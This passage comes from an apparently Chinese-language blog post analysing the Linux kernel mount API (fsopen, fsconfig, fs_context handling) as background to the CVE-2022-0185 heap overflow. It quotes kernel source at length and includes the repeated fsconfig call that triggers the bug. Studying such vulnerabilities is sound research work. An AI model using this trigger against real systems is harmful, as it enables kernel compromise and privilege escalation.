class="hljs-type">unsigned</span> <span class="hljs-type">int</span> sb_flags_mask,</span><br><span class="hljs-params">      <span class="hljs-keyword">enum</span> fs_context_purpose purpose)</span><br>&#123;<br><span class="hljs-type">int</span> (*init_fs_context)(<span class="hljs-keyword">struct</span> fs_context *);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context</span> *<span class="hljs-title">fc</span>;</span><br><span class="hljs-type">int</span> ret = -ENOMEM;<br><br>fc = kzalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> fs_context), GFP_KERNEL_ACCOUNT);<br><span class="hljs-keyword">if</span> (!fc)<br><span class="hljs-keyword">return</span> ERR_PTR(-ENOMEM);<br><br>fc-&gt;purpose= purpose;<br>fc-&gt;sb_flags= sb_flags;<br>fc-&gt;sb_flags_mask = sb_flags_mask;<br>fc-&gt;fs_type= get_filesystem(fs_type);<br>fc-&gt;cred= get_current_cred();<br>fc-&gt;net_ns= get_net(current-&gt;nsproxy-&gt;net_ns);<br>fc-&gt;<span class="hljs-built_in">log</span>.prefix= fs_type-&gt;name;<br><br>mutex_init(&amp;fc-&gt;uapi_mutex);<br><br><span class="hljs-keyword">switch</span> (purpose) &#123;<br><span class="hljs-keyword">case</span> FS_CONTEXT_FOR_MOUNT:<br>fc-&gt;user_ns = get_user_ns(fc-&gt;cred-&gt;user_ns);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> FS_CONTEXT_FOR_SUBMOUNT:<br>fc-&gt;user_ns = get_user_ns(reference-&gt;d_sb-&gt;s_user_ns);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> FS_CONTEXT_FOR_RECONFIGURE:<br><span class="hljs-type">atomic_inc</span>(&amp;reference-&gt;d_sb-&gt;s_active);<br>fc-&gt;user_ns = get_user_ns(reference-&gt;d_sb-&gt;s_user_ns);<br>fc-&gt;root = dget(reference);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-comment">/* <span class="hljs-doctag">TODO:</span> Make all filesystems support this unconditionally */</span><br>init_fs_context = fc-&gt;fs_type-&gt;init_fs_context;<br><span class="hljs-keyword">if</span> (!init_fs_context)<br>init_fs_context = legacy_init_fs_context;<br><br>ret = init_fs_context(fc);<br><span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> err_fc;<br>fc-&gt;need_free = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">return</span> fc;<br><br>err_fc:<br>put_fs_context(fc);<br><span class="hljs-keyword">return</span> ERR_PTR(ret);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里我们发现代码首先是利用kzalloc分配了一个fs_context结构体，也就是我们的一个文件系统上下文，如下：</p><h5 id="fscontext结构体"><a href="#fscontext结构体" class="headerlink" title="fscontext结构体"></a>fscontext结构体</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 文件系统上下文，用于保存创建或重新配置超级块时使用的参数。</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Superblock creation fills in -&gt;root whereas reconfiguration begins with this</span><br><span class="hljs-comment"> * already set.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * See Documentation/filesystems/mount_api.rst</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context</span> &#123;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span><span class="hljs-title">uapi_mutex</span>;</span><span class="hljs-comment">/* Userspace access mutex */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_system_type</span>*<span class="hljs-title">fs_type</span>;</span>  <span class="hljs-comment">/* 文件系统类型 */</span><br><span class="hljs-type">void</span>*fs_private;<span class="hljs-comment">/* 文件系统上下文 */</span><br><span class="hljs-type">void</span>*sget_key;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dentry</span>*<span class="hljs-title">root</span>;</span><span class="hljs-comment">/* rooth */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_namespace</span>*<span class="hljs-title">user_ns</span>;</span><span class="hljs-comment">/* 本次mount的用户命名空间 */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net</span>*<span class="hljs-title">net_ns</span>;</span><span class="hljs-comment">/* 本次mount的网络命名空间 */</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span>*<span class="hljs-title">cred</span>;</span><span class="hljs-comment">/* The mounter&#x27;s credentials */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">p_log</span><span class="hljs-title">log</span>;</span><span class="hljs-comment">/* 日志缓冲区 */</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span>*source;<span class="hljs-comment">/* The source name (eg. dev path) */</span><br><span class="hljs-type">void</span>*security;<span class="hljs-comment">/* Linux S&amp;M options */</span><br><span class="hljs-type">void</span>*s_fs_info;<span class="hljs-comment">/* Proposed s_fs_info */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>sb_flags;<span class="hljs-comment">/* Proposed superblock flags (SB_*) */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>sb_flags_mask;<span class="hljs-comment">/* Superblock flags that were changed */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>s_iflags;<span class="hljs-comment">/* OR&#x27;d with sb-&gt;s_iflags */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>lsm_flags;<span class="hljs-comment">/* Information flags from the fs to the LSM */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">fs_context_purpose</span><span class="hljs-title">purpose</span>:</span><span class="hljs-number">8</span>;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">fs_context_phase</span><span class="hljs-title">phase</span>:</span><span class="hljs-number">8</span>;<span class="hljs-comment">/* The phase the context is in */</span><br><span class="hljs-type">bool</span>need_free:<span class="hljs-number">1</span>;<span class="hljs-comment">/* Need to call ops-&gt;free() */</span><br><span class="hljs-type">bool</span>global:<span class="hljs-number">1</span>;<span class="hljs-comment">/* Goes into &amp;init_user_ns */</span><br><span class="hljs-type">bool</span>oldapi:<span class="hljs-number">1</span>;<span class="hljs-comment">/* Coming from mount(2) */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>看到上面代码后面有这样一段</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xl">...<br><span class="hljs-comment">/* <span class="hljs-doctag">TODO:</span> Make all filesystems support this unconditionally */</span><br><span class="hljs-function"><span class="hljs-title">init_fs_context</span> = fc-&gt;</span><span class="hljs-function"><span class="hljs-title">fs_type</span>-&gt;</span>init_fs_context;<br><span class="hljs-keyword">if</span> (!init_fs_context)<br>init_fs_context = legacy_init_fs_context;<br><br>ret = init_fs_context(fc);<br>...<br></code></pre></td></tr></table></figure><p>其中调用了我们fs_type-&gt;init_fs_context函数（但是该指针好像初始为0，所以一般init_fs_context会指向legacy_init_fs_context,该函数将会在之后漏洞介绍开始讲解），这是在新一代mount系统调用中增添的函数指针字段，之后就是初始化我们新创建的fs_context，然后返回给最初的fsopen系统调用</p><p>因此我们接着来分析后半段的fsopen</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><br>...<br><br>put_filesystem(fs_type);<br><span class="hljs-keyword">if</span> (IS_ERR(fc))<br><span class="hljs-keyword">return</span> PTR_ERR(fc);<br><br>fc-&gt;phase = FS_CONTEXT_CREATE_PARAMS;<br><br>ret = fscontext_alloc_log(fc);<br><span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> err_fc;<br><br><span class="hljs-keyword">return</span> fscontext_create_fd(fc, flags &amp; FSOPEN_CLOEXEC ? O_CLOEXEC : <span class="hljs-number">0</span>);<br><br>err_fc:<br>put_fs_context(fc);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>首先他会调用fscontext_alloc_log(fc),该函数的作用就是为该次文件系统上下文的log字段分配空间，然后将其中的log字段的owner指向当前文件系统类型(filesystem_type)的模块指针owner字段</p><p>之后我们调用fscontext_create_fd函数，其中存在以下调用链</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">fscontext<span class="hljs-constructor">_create_fd(<span class="hljs-params">fc</span>, <span class="hljs-params">flags</span> &amp; FSOPEN_CLOEXEC ? O_CLOEXEC : 0)</span><br>anon<span class="hljs-constructor">_inode_getfd(<span class="hljs-string">&quot;[fscontext]&quot;</span>, &amp;<span class="hljs-params">fscontext_fops</span>, <span class="hljs-params">fc</span>, O_RDWR | <span class="hljs-params">o_flags</span>)</span><br><span class="hljs-constructor">__anon_inode_getfd(<span class="hljs-params">name</span>, <span class="hljs-params">fops</span>, <span class="hljs-params">priv</span>, <span class="hljs-params">flags</span>, NULL, <span class="hljs-params">false</span>)</span> <br></code></pre></td></tr></table></figure><p>其功能是为了返回一个同文件系统类型相联系的fd号，就跟咱们打开文件一样</p><h4 id="anon-inode-getfd"><a href="#anon-inode-getfd" class="headerlink" title="__anon_inode_getfd"></a>__anon_inode_getfd</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">fscontext_fops</span> =</span> &#123;<br>.read= fscontext_read,<br>.release= fscontext_release,<br>.llseek= no_llseek,<br>&#125;;<br><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> __anon_inode_getfd(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *name,<br>      <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> file_operations *fops,<br>      <span class="hljs-type">void</span> *priv, <span class="hljs-type">int</span> flags, <span class="hljs-comment">//这里priv就是之前创建的fscontext</span><br>      <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> inode *context_inode, <span class="hljs-comment">//为NULL，匿名inode</span><br>      <span class="hljs-type">bool</span> secure)<br>&#123;<br><span class="hljs-type">int</span> error, fd;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span>;</span><br><br>error = get_unused_fd_flags(flags); <span class="hljs-comment">//获取空闲文件描述符</span><br><span class="hljs-keyword">if</span> (error &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> error;<br>fd = error;<br><br>file = __anon_inode_getfile(name, fops, priv, flags, context_inode, secure);  <span class="hljs-comment">//获取一个[fscontext]的文件实例，其中的文件函数指针被设置为&quot;fscontext_fops&quot;</span><br><span class="hljs-keyword">if</span> (IS_ERR(file)) &#123;<br>error = PTR_ERR(file);<br><span class="hljs-keyword">goto</span> err_put_unused_fd;<br>&#125;<br>fd_install(fd, file);<br><br><span class="hljs-keyword">return</span> fd;<br><br>err_put_unused_fd:<br>put_unused_fd(fd);<br><span class="hljs-keyword">return</span> error;<br>&#125;<br></code></pre></td></tr></table></figure><p>该函数整体的功能就是创建一个[fscontext]文件实例，然后返回fd号，这里也是同我们之前的fscontext创建了联系，创建联系的关键函数就是</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">__anon_inode_getfile(<span class="hljs-params">name</span>, <span class="hljs-params">fops</span>, <span class="hljs-params">priv</span>, <span class="hljs-params">flags</span>, <span class="hljs-params">context_inode</span>, <span class="hljs-params">secure</span>)</span><br></code></pre></td></tr></table></figure><p>该函数有这样一段代码</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">file-&gt;private_data <span class="hljs-operator">=</span> priv<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>其中file的private_date 被赋值为我们的priv，该字段通过咱们之前的分析是指向了先前创建的fscontext的，通过这一链接，我们就可以通过特殊的文件函数指针来进行相关操作了</p><p>这里总结一下fsopen的步骤</p><ol><li>获取相应的文件系统类型</li><li>构建文件系统上下文，fscontext，将其与上面的fstype通过字段相关联</li><li>获取[fscontext]文件，通过字段与fscontext相关联，且其中函数指针为一个全局虚函数表</li><li>返回上面文件的描述符fd，以后都是通过该描述符来进行操作</li></ol><p>调用链为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">sys_fsopen<br>get_fs_type <span class="hljs-comment">//获取fs_type</span><br>fs_context_for_mount<br>alloc_fs_context <span class="hljs-comment">//分配fscontext以及初始化部分字段</span><br>fscontext_alloc_log <br>fscontext_create_fd <br>anon_inode_getfd<br>__anon_inode_getfd <span class="hljs-comment">//创建文件与fscontext关联，并返回fd</span><br></code></pre></td></tr></table></figure><h3 id="2-fsconfig"><a href="#2-fsconfig" class="headerlink" title="2.fsconfig"></a>2.fsconfig</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * sys_fsconfig - 在一个上下文当中设置参数并且触发行动</span><br><span class="hljs-comment"> * @fd: 之前fsopen获得的文件系统上下文相关联的fd</span><br><span class="hljs-comment"> * @cmd: 指令</span><br><span class="hljs-comment"> * @_key: 键</span><br><span class="hljs-comment"> * @_value: 值</span><br><span class="hljs-comment"> * @aux: value参数的附加信息</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This system call is used to set parameters on a context, including</span><br><span class="hljs-comment"> * superblock settings, data source and security labelling.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Actions include triggering the creation of a superblock and the</span><br><span class="hljs-comment"> * reconfiguration of the superblock attached to the specified context.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * When setting a parameter, @cmd indicates the type of value being proposed</span><br><span class="hljs-comment"> * and @_key indicates the parameter to be altered.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * @_value and @aux are used to specify the value, should a value be required:</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * (*) fsconfig_set_flag: No value is specified.  The parameter must be boolean</span><br><span class="hljs-comment"> *     in nature.  The key may be prefixed with &quot;no&quot; to invert the</span><br><span class="hljs-comment"> *     setting. @_value must be NULL and @aux must be 0.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * (*) fsconfig_set_string：指定字符串值。 </span><br><span class="hljs-comment"> * 该参数可以是布尔值、整数、字符串或采用路径。 </span><br><span class="hljs-comment"> * 将尝试转换为适当的类型（可能包括作为路径查找）。 </span><br><span class="hljs-comment"> * @_value 指向以 NUL 结尾的字符串，@aux 必须为 0。</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * (*) fsconfig_set_binary: A binary blob is specified.  @_value points to the</span><br><span class="hljs-comment"> *     blob and @aux indicates its size.  The parameter must be expecting a</span><br><span class="hljs-comment"> *     blob.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * (*) fsconfig_set_path: A non-empty path is specified.  The parameter must be</span><br><span class="hljs-comment"> *     expecting a path object.  @_value points to a NUL-terminated string that</span><br><span class="hljs-comment"> *     is the path and @aux is a file descriptor at which to start a relative</span><br><span class="hljs-comment"> *     lookup or AT_FDCWD.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * (*) fsconfig_set_path_empty: As fsconfig_set_path, but with AT_EMPTY_PATH</span><br><span class="hljs-comment"> *     implied.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * (*) fsconfig_set_fd: An open file descriptor is specified.  @_value must be</span><br><span class="hljs-comment"> *     NULL and @aux indicates the file descriptor.</span><br><span class="hljs-comment"> */</span><br>SYSCALL_DEFINE5(fsconfig,<br><span class="hljs-type">int</span>, fd,<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, cmd,<br><span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *, _key,<br><span class="hljs-type">const</span> <span class="hljs-type">void</span> __user *, _value,<br><span class="hljs-type">int</span>, aux)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context</span> *<span class="hljs-title">fc</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fd</span> <span class="hljs-title">f</span>;</span><br><span class="hljs-type">int</span> ret;<br><span class="hljs-type">int</span> lookup_flags = <span class="hljs-number">0</span>;<br><br>...<br></code></pre></td></tr></table></figure><h1 id="三、漏洞介绍"><a href="#三、漏洞介绍" class="headerlink" title="三、漏洞介绍"></a>三、漏洞介绍</h1><p>该漏洞适用于内核版本5.1，且至少持续到5.16，通过syzbot检测到并进行利用，其中洞主在<a href="https://www.willsroot.io/2022/01/cve-2022-0185.html">博客</a>中首先给出了一个崩溃poc，但是我在5.4内核版本的linux当中无法触发，因此下面来尝试分析一下漏洞链条和自行编写触发漏洞poc</p><h2 id="1-崩溃链"><a href="#1-崩溃链" class="headerlink" title="1.崩溃链"></a>1.崩溃链</h2><p>首先对于fsopen在之前已经讲解的十分清楚，就是返回一个与fscontext相关联的fd而已，然后重要的就是后面的fsconfig系统调用，</p><p>可以看到上面poc中不停调用以下代码</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">fsconfig</span>(fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;\x00&quot;</span>, val, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>其中cmd指针传递的<code>FSCONFIG_SET_STRING</code>,这里注意我们的键值都不能为null，不然就直接返回错误了，大伙也可以自行去查看相关源码，</p><p>咱们只关心即将调用到的函数链条，在系统调用fsconfig当中，他会走到下面这段代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_parameter</span> <span class="hljs-title">param</span> =</span> &#123;<br>.type= fs_value_is_undefined,<br>&#125;;<br><br>...<br><br><span class="hljs-keyword">case</span> FSCONFIG_SET_STRING:<br>param.type = fs_value_is_string;<br>param.<span class="hljs-built_in">string</span> = strndup_user(_value, <span class="hljs-number">256</span>);<br><span class="hljs-keyword">if</span> (IS_ERR(param.<span class="hljs-built_in">string</span>)) &#123;<br>ret = PTR_ERR(param.<span class="hljs-built_in">string</span>);<br><span class="hljs-keyword">goto</span> out_key;<br>&#125;<br>param.size = <span class="hljs-built_in">strlen</span>(param.<span class="hljs-built_in">string</span>);<br><span class="hljs-keyword">break</span>;<br>...<br><br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>ret = mutex_lock_interruptible(&amp;fc-&gt;uapi_mutex);<br><span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span>) &#123;<br>ret = vfs_fsconfig_locked(fc, cmd, &amp;param);<br>mutex_unlock(&amp;fc-&gt;uapi_mutex);<br>&#125;<br><br>...<br><br></code></pre></td></tr></table></figure><p>其中param字段的数据结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 配置参数</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_parameter</span> &#123;</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span>*key;<span class="hljs-comment">/* 参数名称 */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">fs_value_type</span><span class="hljs-title">type</span>:</span><span class="hljs-number">8</span>;<span class="hljs-comment">/* _value的类型 */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-type">char</span>*<span class="hljs-built_in">string</span>;<br><span class="hljs-type">void</span>*blob;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">filename</span>*<span class="hljs-title">name</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span>*<span class="hljs-title">file</span>;</span><br>&#125;;<br><span class="hljs-type">size_t</span>size;<br><span class="hljs-type">int</span>dirfd;<br>&#125;;<br></code></pre></td></tr></table></figure><p>其中会调用到一个关键的开头函数<code>vfs_fsconfig_locked</code>,在该函数的switch当中会因为没有对应的case而走到default当中，并且在一般情况下这个if</p><p>条件是不满足的，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">if</span> (fc-&gt;phase != FS_CONTEXT_CREATE_PARAMS &amp;&amp;<br>    fc-&gt;phase != FS_CONTEXT_RECONF_PARAMS)<br><span class="hljs-keyword">return</span> -EBUSY;<br><br><span class="hljs-keyword">return</span> vfs_parse_fs_param(fc, param);<br>&#125;<br>fc-&gt;phase = FS_CONTEXT_FAILED;<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>导致后面会调用<code>vfs_parse_fs_param</code>函数</p><h3 id="vfs-parse-fs-param"><a href="#vfs-parse-fs-param" class="headerlink" title="vfs_parse_fs_param"></a>vfs_parse_fs_param</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">vfs_parse_fs_param</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fs_context *fc, <span class="hljs-keyword">struct</span> fs_parameter *param)</span><br>&#123;<br><span class="hljs-type">int</span> ret;<br><br><span class="hljs-keyword">if</span> (!param-&gt;key)<br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;Unnamed parameter\n&quot;</span>);<br><br>ret = vfs_parse_sb_flag(fc, param-&gt;key);<br><br>...<br><br><span class="hljs-keyword">if</span> (fc-&gt;ops-&gt;parse_param) &#123;<br>ret = fc-&gt;ops-&gt;parse_param(fc, param);<br><span class="hljs-keyword">if</span> (ret != -ENOPARAM)<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br><br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>他会调用fscontext中的ops函数表指向的parse_param函数，也就是解析我们传递的参数，这里fscontext所指向的表我们在之前分析fsopen的时候有讲到说在后面分析，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">...<br><span class="hljs-comment">/* <span class="hljs-doctag">TODO:</span> Make all filesystems support this unconditionally */</span><br>init_fs_context = fc-&gt;fs_type-&gt;init_fs_context;<br><span class="hljs-keyword">if</span> (!init_fs_context)<br>init_fs_context = legacy_init_fs_context;<br><br>ret = init_fs_context(fc);<br>...<br></code></pre></td></tr></table></figure><p>willsroot原话</p><blockquote><p>我们在漏洞利用中滥用的是 ext4。 我们最初的模糊测试崩溃发生在 Plan 9 文件系统上。 似乎在这两个文件系统（以及大量其他文件系统）中都没有设置 init_fs_context 字段，因此它们都默认为legacy并且可以沿着legacy_parse_param的路径走下去。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Initialise a legacy context for a filesystem that doesn&#x27;t support</span><br><span class="hljs-comment"> * fs_context.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">legacy_init_fs_context</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fs_context *fc)</span><br>&#123;<br>fc-&gt;fs_private = kzalloc(<span 